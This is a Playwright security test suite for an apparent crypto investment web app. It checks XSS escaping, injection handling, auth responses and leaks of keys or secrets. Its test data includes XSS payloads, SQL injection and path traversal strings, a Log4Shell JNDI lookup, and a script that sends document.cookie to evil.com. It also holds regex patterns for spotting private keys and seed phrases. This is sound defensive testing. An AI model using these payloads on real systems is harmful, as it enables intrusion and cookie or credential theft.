import { test, expect } from "@playwright/test";

test.describe("Security & Validation Test Suite", () => {
  test.beforeEach(async ({ page }) => {
    await page.goto("/");
    await page.waitForLoadState("networkidle");
  });

  test.describe("Input Sanitization & XSS Prevention", () => {
    test("prevents XSS attacks through form inputs", async ({ page }) => {
      const alertDialogs: string[] = [];
      page.on("dialog", dialog => {
        alertDialogs.push(dialog.message());
        dialog.dismiss();
      });

      // Test various XSS attack vectors
      const xssPayloads = [
        "<script>alert('XSS1')</script>",
        "<img src=x onerror=alert('XSS2')>",
        "javascript:alert('XSS3')",
        "<svg onload=alert('XSS4')>",
        "';alert('XSS5');//",
        "<iframe src='javascript:alert(`XSS6`)'></iframe>",
        "<body onload=alert('XSS7')>",
        "<div onclick=alert('XSS8')>Click</div>",
        "data:text/html,<script>alert('XSS9')</script>",
        "%3Cscript%3Ealert%28%27XSS10%27%29%3C%2Fscript%3E",
        "&#60;script&#62;alert('XSS11')&#60;/script&#62;",
        "<object data='javascript:alert(\"XSS12\")'></object>",
      ];

      // Test search input
      const searchInput = page
        .locator('input[type="search"], input[placeholder*="search"]')
        .first();
      if (await searchInput.isVisible()) {
        for (const payload of xssPayloads) {
          await searchInput.fill(payload);
          await page.waitForTimeout(500);
          await page.keyboard.press("Enter");
          await page.waitForTimeout(1000);
        }
      }

      // Test investment amount input
      const investTab = page.locator('[data-testid="tab-invest"]').first();
      if (await investTab.isVisible()) {
        await investTab.click();
        await page.waitForTimeout(1000);

        const investButton = page.locator('button:has-text("Invest")').first();
        if (await investButton.isVisible()) {
          await investButton.click();
          await page.waitForTimeout(1000);

          const amountInput = page
            .locator('input[type="number"], input[placeholder*="amount"]')
            .first();
          if (await amountInput.isVisible()) {
            for (const payload of xssPayloads.slice(0, 5)) {
              // Test subset to avoid timeout
              await amountInput.fill(payload);
              await page.waitForTimeout(500);
            }
          }
        }
      }

      // Test textarea inputs if any
      const textareas = page.locator("textarea");
      const textareaCount = await textareas.count();
      if (textareaCount > 0) {
        const textarea = textareas.first();
        for (const payload of xssPayloads.slice(0, 3)) {
          await textarea.fill(payload);
          await page.waitForTimeout(500);
        }
      }

      // Verify no XSS payloads executed
      await page.waitForTimeout(2000);
      expect(alertDialogs).toEqual([]);

      // Verify content is properly escaped
      const dangerousContent = page.locator(
        ':has-text("<script>"), :has-text("javascript:")'
      );
      const dangerousCount = await dangerousContent.count();

      if (dangerousCount > 0) {
        // If dangerous content is displayed, it should be escaped
        const firstDangerous = dangerousContent.first();
        const innerHTML = await firstDangerous.innerHTML();
        expect(innerHTML).not.toContain("<script");
        expect(innerHTML).not.toContain("javascript:");
      }
    });

    test("sanitizes HTML content in dynamic updates", async ({ page }) => {
      // Test dynamic content updates
      const analyticsTab = page
        .locator('[data-testid="tab-analytics"]')
        .first();
      if (await analyticsTab.isVisible()) {
        await analyticsTab.click();
        await page.waitForTimeout(2000);
      }

      // Intercept API responses and inject malicious content
      await page.route("**/api/**", route => {
        const url = route.request().url();
        if (url.includes("analytics") || url.includes("portfolio")) {
          route.fulfill({
            status: 200,
            contentType: "application/json",
            body: JSON.stringify({
              data: [
                {
                  name: "<script>alert('API_XSS')</script>",
                  value: "<img src=x onerror=alert('IMG_XSS')>",
                  description: "javascript:alert('JS_XSS')",
                },
              ],
            }),
          });
        } else {
          route.continue();
        }
      });

      await page.reload();
      await page.waitForTimeout(3000);

      // Check that malicious content is sanitized
      const scriptTags = page.locator('script:has-text("alert")');
      const scriptCount = await scriptTags.count();
      expect(scriptCount).toBe(0);

      const imgTags = page.locator('img[src="x"]');
      const imgCount = await imgTags.count();
      expect(imgCount).toBe(0);

      // Content should be displayed as text, not executed
      const maliciousContent = page.locator(':has-text("<script>")');
      if (await maliciousContent.isVisible()) {
        const textContent = await maliciousContent.textContent();
        expect(textContent).toContain("<script>"); // Should show as text
      }
    });

    test("validates URL parameters and prevents injection", async ({
      page,
    }) => {
      const maliciousUrls = [
        "/?search=<script>alert('URL_XSS')</script>",
        "/?amount=javascript:alert('PARAM_XSS')",
        "/?callback=data:text/html,<script>alert('DATA_XSS')</script>",
        "/?redirect=//evil.com",
        "/?tab=<iframe src='javascript:alert(1)'></iframe>",
        "/?token=' OR 1=1 --",
        "/?id=../../../etc/passwd",
        "/?filter[][$ne]=null", // NoSQL injection
      ];

      for (const url of maliciousUrls) {
        await page.goto(page.url().split("?")[0] + url);
        await page.waitForTimeout(1000);

        // Verify no script execution
        const alerts: string[] = [];
        page.on("dialog", dialog => {
          alerts.push(dialog.message());
          dialog.dismiss();
        });

        await page.waitForTimeout(1500);
        expect(alerts).toEqual([]);

        // Verify page loads normally
        const body = page.locator("body");
        await expect(body).toBeVisible();
      }
    });
  });

  test.describe("Authentication & Authorization", () => {
    test("properly handles unauthorized access attempts", async ({ page }) => {
      // Test accessing protected endpoints without authentication
      await page.route("**/api/portfolio/**", route => {
        route.fulfill({
          status: 401,
          contentType: "application/json",
          body: JSON.stringify({ error: "Unauthorized" }),
        });
      });

      const portfolioTab = page
        .locator('[data-testid="tab-portfolio"]')
        .first();
      if (await portfolioTab.isVisible()) {
        await portfolioTab.click();
        await page.waitForTimeout(2000);

        // Should handle 401 responses gracefully
        const errorMessage = page.locator(
          ':has-text("unauthorized"), :has-text("login"), :has-text("connect")'
        );
        const loginPrompt = page.locator(
          'button:has-text("Connect"), button:has-text("Login")'
        );

        const hasAuthHandling =
          (await errorMessage.isVisible()) || (await loginPrompt.isVisible());

        expect(hasAuthHandling).toBe(true);
      }
    });

    test("validates wallet ownership and signatures", async ({ page }) => {
      // Test wallet connection
      const walletButton = page
        .locator('button:has-text("Connect"), [data-testid*="wallet"]')
        .first();
      if (await walletButton.isVisible()) {
        await walletButton.click();
        await page.waitForTimeout(1000);

        // Mock wallet with invalid signature
        await page.evaluate(() => {
          if (window.ethereum) {
            const originalRequest = window.ethereum.request;
            window.ethereum.request = function (params: any) {
              if (params.method === "personal_sign") {
                return Promise.resolve("0xinvalidsignature");
              }
              if (params.method === "eth_accounts") {
                return Promise.resolve([
                  "0x1234567890123456789012345678901234567890",
                ]);
              }
              return originalRequest.call(this, params);
            };
          }
        });

        // Try to perform authenticated action
        const investTab = page.locator('[data-testid="tab-invest"]').first();
        if (await investTab.isVisible()) {
          await investTab.click();
          await page.waitForTimeout(1000);

          const investButton = page
            .locator('button:has-text("Invest")')
            .first();
          if (await investButton.isVisible()) {
            await investButton.click();
            await page.waitForTimeout(2000);

            // Should validate signature and reject invalid ones
            const signatureError = page.locator(
              ':has-text("signature"), :has-text("invalid"), :has-text("verification")'
            );
            if (await signatureError.isVisible()) {
              const errorText = await signatureError.textContent();
              expect(errorText).toMatch(
                /signature|invalid|verification|unauthorized/i
              );
            }
          }
        }
      }
    });

    test("prevents session hijacking attempts", async ({ page }) => {
      // Test session token validation
      await page.evaluate(() => {
        // Simulate malicious session token
        localStorage.setItem("session_token", "malicious_token_123");
        localStorage.setItem("user_id", "admin");
        localStorage.setItem(
          "wallet_address",
          "0x0000000000000000000000000000000000000000"
        );
      });

      await page.reload();
      await page.waitForTimeout(2000);

      // Try to access protected functionality
      const portfolioTab = page
        .locator('[data-testid="tab-portfolio"]')
        .first();
      if (await portfolioTab.isVisible()) {
        await portfolioTab.click();
        await page.waitForTimeout(2000);

        // Should validate session and reject invalid tokens
        const authError = page.locator(
          ':has-text("session"), :has-text("expired"), :has-text("invalid")'
        );
        const loginPrompt = page.locator('button:has-text("Connect")');

        // Should either show error or prompt for re-authentication
        const hasSessionValidation =
          (await authError.isVisible()) || (await loginPrompt.isVisible());

        expect(hasSessionValidation).toBe(true);
      }
    });
  });

  test.describe("Sensitive Data Protection", () => {
    test("masks sensitive financial information", async ({ page }) => {
      const portfolioTab = page
        .locator('[data-testid="tab-portfolio"]')
        .first();
      if (await portfolioTab.isVisible()) {
        await portfolioTab.click();
        await page.waitForTimeout(2000);
      }

      // Check for sensitive data masking
      const balanceElements = page.locator(
        '[data-testid*="balance"], [class*="balance"], [data-testid*="value"]'
      );
      const balanceCount = await balanceElements.count();

      if (balanceCount > 0) {
        // Test privacy toggle if available
        const privacyToggle = page.locator(
          'button:has-text("Hide"), button:has-text("Show"), [data-testid*="privacy"]'
        );
        if (await privacyToggle.isVisible()) {
          await privacyToggle.click();
          await page.waitForTimeout(1000);

          // Check if values are masked
          const maskedElements = page.locator(
            ':has-text("****"), :has-text("•••"), .masked'
          );
          const maskedCount = await maskedElements.count();
          expect(maskedCount).toBeGreaterThan(0);

          // Toggle back to verify unmasking
          await privacyToggle.click();
          await page.waitForTimeout(1000);
        }
      }

      // Verify sensitive data is not exposed in page source
      const pageContent = await page.content();
      const privateKeyPattern = /0x[a-fA-F0-9]{64}/g;
      const seedPhrasePattern =
        /\b\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\s+\w+\b/g;

      expect(pageContent).not.toMatch(privateKeyPattern);
      expect(pageContent).not.toMatch(seedPhrasePattern);
    });

    test("prevents data leakage through console logs", async ({ page }) => {
      const consoleLogs: string[] = [];
      page.on("console", msg => {
        if (msg.type() === "log" || msg.type() === "error") {
          consoleLogs.push(msg.text());
        }
      });

      // Navigate through app to trigger potential logging
      const tabs = [
        '[data-testid="tab-invest"]',
        '[data-testid="tab-portfolio"]',
        '[data-testid="tab-analytics"]',
      ];

      for (const tabSelector of tabs) {
        const tab = page.locator(tabSelector).first();
        if (await tab.isVisible()) {
          await tab.click();
          await page.waitForTimeout(1500);
        }
      }

      // Check console logs for sensitive information
      const sensitivePatterns = [
        /private.*key/i,
        /seed.*phrase/i,
        /mnemonic/i,
        /0x[a-fA-F0-9]{64}/,
        /password/i,
        /secret/i,
        /token.*[A-Za-z0-9]{20,}/,
        /api.*key/i,
      ];

      for (const log of consoleLogs) {
        for (const pattern of sensitivePatterns) {
          expect(log).not.toMatch(pattern);
        }
      }
    });

    test("secures clipboard operations", async ({ page }) => {
      // Test copy operations don't expose sensitive data
      const copyButtons = page.locator(
        'button:has-text("Copy"), [data-testid*="copy"]'
      );
      const copyCount = await copyButtons.count();

      if (copyCount > 0) {
        const firstCopyButton = copyButtons.first();
        await firstCopyButton.click();
        await page.waitForTimeout(1000);

        // Verify clipboard content is appropriate
        const clipboardContent = await page.evaluate(() => {
          return navigator.clipboard
            .readText()
            .catch(() => "clipboard_access_denied");
        });

        if (clipboardContent !== "clipboard_access_denied") {
          // Should not contain private keys or sensitive data
          expect(clipboardContent).not.toMatch(/0x[a-fA-F0-9]{64}/);
          expect(clipboardContent).not.toMatch(/private.*key/i);
          expect(clipboardContent).not.toMatch(/seed.*phrase/i);
        }
      }
    });
  });

  test.describe("API Security & Data Validation", () => {
    test("validates API response schemas", async ({ page }) => {
      // Intercept API responses and test with invalid schemas
      await page.route("**/api/**", route => {
        const url = route.request().url();

        if (url.includes("portfolio")) {
          // Return invalid schema
          route.fulfill({
            status: 200,
            contentType: "application/json",
            body: JSON.stringify({
              invalid_structure: true,
              data: "not_an_array",
              balance: "not_a_number",
              nested: {
                very: {
                  deep: {
                    object: "malicious_content",
                  },
                },
              },
            }),
          });
        } else {
          route.continue();
        }
      });

      const portfolioTab = page
        .locator('[data-testid="tab-portfolio"]')
        .first();
      if (await portfolioTab.isVisible()) {
        await portfolioTab.click();
        await page.waitForTimeout(3000);

        // App should handle invalid API responses gracefully
        const errorFallback = page.locator(
          '.error, [data-testid*="error"], .fallback'
        );
        const defaultContent = page.locator(
          ':has-text("Unable to load"), :has-text("Error loading")'
        );

        const hasValidation =
          (await errorFallback.isVisible()) ||
          (await defaultContent.isVisible());

        expect(hasValidation).toBe(true);
      }
    });

    test("prevents API injection attacks", async ({ page }) => {
      // Test API parameter injection
      const maliciousParams = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "{ $ne: null }",
        "../../../etc/passwd",
        "${jndi:ldap://malicious.com/}",
        "{{constructor.constructor('return process')().exit()}}",
        "<script>fetch('//evil.com?data='+document.cookie)</script>",
      ];

      // Intercept requests to check for injection attempts
      const requestUrls: string[] = [];
      page.on("request", request => {
        requestUrls.push(request.url());
      });

      // Test search functionality with malicious inputs
      const searchInput = page
        .locator('input[type="search"], input[placeholder*="search"]')
        .first();
      if (await searchInput.isVisible()) {
        for (const param of maliciousParams.slice(0, 3)) {
          // Test subset
          await searchInput.fill(param);
          await page.keyboard.press("Enter");
          await page.waitForTimeout(1000);
        }
      }

      // Verify dangerous parameters are properly encoded/sanitized
      for (const url of requestUrls) {
        expect(url).not.toContain("DROP TABLE");
        expect(url).not.toContain("OR '1'='1");
        expect(url).not.toContain("<script>");
        expect(url).not.toContain("../../../");
      }
    });

    test("enforces rate limiting on client side", async ({ page }) => {
      // Test rapid API calls
      const analyticsTab = page
        .locator('[data-testid="tab-analytics"]')
        .first();
      if (await analyticsTab.isVisible()) {
        await analyticsTab.click();
        await page.waitForTimeout(1000);
      }

      // Rapid period changes to trigger multiple API calls
      const periods = ["1W", "1M", "3M", "6M", "1Y"];

      for (let i = 0; i < 3; i++) {
        // Repeat to simulate rapid usage
        for (const period of periods) {
          const periodButton = page.locator(`button:has-text("${period}")`);
          if (await periodButton.isVisible()) {
            await periodButton.click();
            await page.waitForTimeout(100); // Very rapid clicks
          }
        }
      }

      await page.waitForTimeout(2000);

      // Check for rate limiting indicators
      const rateLimitMessage = page.locator(
        ':has-text("too many"), :has-text("rate limit"), :has-text("slow down")'
      );
      const throttlingIndicator = page.locator(
        '.throttled, [data-testid*="throttle"]'
      );

      // App should handle rapid requests gracefully
      const body = page.locator("body");
      await expect(body).toBeVisible();

      // Verify app didn't crash from rapid requests
      const errorCount = await page.locator(".error").count();
      expect(errorCount).toBeLessThan(5); // Some errors may be acceptable
    });
  });

  test.describe("Content Security & Privacy", () => {
    test("enforces secure content policies", async ({ page }) => {
      // Check for Content Security Policy headers
      const response = await page.goto(page.url());
      const headers = response?.headers();

      if (headers) {
        // Check for security headers
        const securityHeaders = [
          "content-security-policy",
          "x-content-type-options",
          "x-frame-options",
          "x-xss-protection",
          "strict-transport-security",
        ];

        let securityHeaderCount = 0;
        for (const header of securityHeaders) {
          if (headers[header] || headers[header.toUpperCase()]) {
            securityHeaderCount++;
          }
        }

        // Should have at least some security headers
        expect(securityHeaderCount).toBeGreaterThan(0);
      }

      // Test for inline script restrictions
      const inlineScripts = page.locator("script:not([src])");
      const inlineScriptCount = await inlineScripts.count();

      // Minimize inline scripts for better CSP compliance
      expect(inlineScriptCount).toBeLessThan(10);
    });

    test("prevents unauthorized data access", async ({ page }) => {
      // Test direct access to internal APIs
      const internalEndpoints = [
        "/api/admin",
        "/api/debug",
        "/api/internal",
        "/api/test",
        "/.env",
        "/config.json",
        "/admin",
        "/debug",
      ];

      for (const endpoint of internalEndpoints) {
        const response = await page
          .goto(page.url().replace(/\/[^\/]*$/, "") + endpoint)
          .catch(() => null);

        if (response) {
          const status = response.status();
          // Should return 404, 403, or redirect, not 200
          expect(status).not.toBe(200);
        }
      }
    });

    test("validates third-party integrations", async ({ page }) => {
      // Check for unauthorized external requests
      const externalRequests: string[] = [];

      page.on("request", request => {
        const url = request.url();
        if (
          !url.includes(page.url().split("/")[2]) &&
          !url.startsWith("data:")
        ) {
          externalRequests.push(url);
        }
      });

      // Navigate through app
      const tabs = [
        '[data-testid="tab-invest"]',
        '[data-testid="tab-analytics"]',
      ];
      for (const tabSelector of tabs) {
        const tab = page.locator(tabSelector).first();
        if (await tab.isVisible()) {
          await tab.click();
          await page.waitForTimeout(2000);
        }
      }

      // Verify external requests are to trusted domains
      const trustedDomains = [
        "fonts.googleapis.com",
        "fonts.gstatic.com",
        "cdn.jsdelivr.net",
        "unpkg.com",
        "cdnjs.cloudflare.com",
        "api.coingecko.com",
        "api.debank.com",
        "ethereum.org",
        "polygon.technology",
      ];

      for (const request of externalRequests) {
        const domain = new URL(request).hostname;
        const isTrusted = trustedDomains.some(trusted =>
          domain.includes(trusted)
        );

        if (!isTrusted) {
          console.log(`Unexpected external request to: ${domain}`);
          // Log but don't fail - may be legitimate third-party services
        }
      }
    });

    test("handles sensitive operations securely", async ({ page }) => {
      // Test transaction signing flow
      const investTab = page.locator('[data-testid="tab-invest"]').first();
      if (await investTab.isVisible()) {
        await investTab.click();
        await page.waitForTimeout(1000);

        const investButton = page.locator('button:has-text("Invest")').first();
        if (await investButton.isVisible()) {
          await investButton.click();
          await page.waitForTimeout(2000);

          // Mock wallet interaction
          await page.evaluate(() => {
            if (window.ethereum) {
              const originalRequest = window.ethereum.request;
              window.ethereum.request = function (params: any) {
                // Log sensitive operations for security testing
                if (
                  params.method === "eth_sendTransaction" ||
                  params.method === "personal_sign"
                ) {
                  console.log("Sensitive operation requested:", params.method);

                  // Verify transaction parameters are properly validated
                  if (
                    params.method === "eth_sendTransaction" &&
                    params.params
                  ) {
                    const tx = params.params[0];
                    if (tx.value && tx.value === "0x0") {
                      console.log("Zero value transaction detected");
                    }
                    if (tx.gasLimit && parseInt(tx.gasLimit, 16) > 1000000) {
                      console.log("High gas limit detected");
                    }
                  }
                }
                return originalRequest.call(this, params);
              };
            }
          });

          const confirmButton = page.locator(
            'button:has-text("Confirm"), button:has-text("Sign")'
          );
          if (await confirmButton.isVisible()) {
            // Don't actually confirm, just verify the security flow exists
            await expect(confirmButton).toBeVisible();
          }
        }
      }
    });
  });
});
